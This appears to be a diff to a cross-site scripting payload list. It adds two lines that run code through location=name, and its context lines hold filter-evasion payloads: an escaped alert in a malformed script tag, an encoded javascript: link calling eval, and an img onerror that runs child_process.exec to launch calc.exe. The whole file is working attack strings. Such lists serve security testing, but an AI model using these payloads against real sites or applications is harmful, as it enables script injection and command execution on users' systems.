@@ -1,3 +1,5 @@
+x(""+{a:location=name}+"")
+x(""+new class b{toString=e=>location=name}+"")
 <select><noembed></select><script x='a@b'a>y='a@b'//a@b%0a\u0061lert(1)</script x>
 <A href="javascrip%09t&colon;eval.apply`${[jj.className+`(23)`]}`" id=jj class=alert>Click Here
 <img/src="1"/onerror=eval(`require("child_process").exec("calc.exe");`);>
